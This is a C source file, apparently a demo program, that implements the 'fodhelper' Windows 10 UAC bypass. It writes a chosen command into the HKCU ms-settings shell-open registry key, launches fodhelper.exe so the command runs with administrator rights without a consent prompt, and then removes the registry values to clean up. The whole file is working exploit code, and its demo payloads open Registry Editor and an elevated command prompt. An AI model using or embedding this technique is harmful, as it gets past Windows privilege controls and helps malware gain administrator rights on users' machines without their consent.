#include <stdio.h>
#include <Windows.h>
#include "CurrProcUserIsAdmin.h"

void DisableWow64Redirect(void)
{
	PVOID pDummy = NULL;
	typedef BOOL(WINAPI *fn_t)(PVOID *);
	fn_t fn = (fn_t)GetProcAddress(LoadLibraryA("kernel32"),
		"Wow64DisableWow64FsRedirection");
	if (fn) {
		fn(&pDummy);
	}
}

BOOL IsFodhelperExist(void)
{
	DWORD fileAttr = GetFileAttributesW(
		L"C:\\Windows\\System32\\fodhelper.exe");
	return (fileAttr != -1);
}

BOOL IsUacStrict(void)
{
	HKEY hkey = NULL;
	RegOpenKeyExW(HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		0, KEY_QUERY_VALUE, &hkey);
	if (hkey)
	{
		DWORD val = 0;
		DWORD cb = sizeof(DWORD);
		RegQueryValueExW(hkey,
			L"ConsentPromptBehaviorAdmin",
			NULL, NULL, (LPBYTE)&val, &cb);
		return (val != 0 && val != 5);
	}
	return FALSE;
}

BOOL CheckEnv(void)
{
	if (!IsFodhelperExist()) {
		printf("fodhelper not exist.\n");
		printf("Are you running Win10? \n");
		return FALSE;
	}
	if (!CurrProcUserIsAdmin()) {
		printf("Current user must be an administrator.\n");
		return FALSE;
	}
	if (IsUacStrict()) {
		printf("UAC setting is too strict.\n");
		return FALSE;
	}
	return TRUE;
}

BOOL Run(LPCWSTR szCmdline)
{
	BOOL ret = FALSE;
	HKEY hkey = NULL;
	RegCreateKeyExW(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
		0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS, NULL, &hkey, NULL);
	if (hkey)
	{
		LONG err = 0;
		DWORD cb = 0;
		WCHAR szSysPath[MAX_PATH] = {0};
		WCHAR szTmp[999] = {0};
		STARTUPINFOW si = {0};
		PROCESS_INFORMATION pi = {0};

		cb = sizeof(WCHAR) * (lstrlenW(szCmdline) + 1);
		err = RegSetValueExW(hkey, NULL, 0, REG_EXPAND_SZ,
			(LPBYTE)szCmdline, cb);
		if (err) return ret;
		RegSetValueExW(hkey, L"DelegateExecute", 0, REG_SZ,
			NULL, 0);
		if (err) return ret;
		GetSystemDirectoryW(szSysPath, MAX_PATH);
		wsprintfW(szTmp,
			L"%s\\cmd.exe /c start %s\\fodhelper.exe",
			szSysPath, szSysPath);
		ret = CreateProcessW(NULL, szTmp,
			NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, 1000);
		Sleep(100);
		RegDeleteValueW(hkey, NULL);
		RegDeleteValueW(hkey, L"DelegateExecute");
		RegCloseKey(hkey);
	}
	return ret;
}

int main()
{
	printf("Win10 UAC bypass - fodhelper \n");
	printf("Exploit found by winscripting.blog \n");
	printf("Demo program coded by raymai97 \n\n");
	DisableWow64Redirect();
	if (CheckEnv()) 
	{
		Run(L"regedit.exe /m");
		Run(L"cmd.exe /k echo CMD run as Administrator!");
		printf("If it works, you will see Registry Editor and "
			"Command Prompt (Administrator). \n");
	}
	return 0;
}
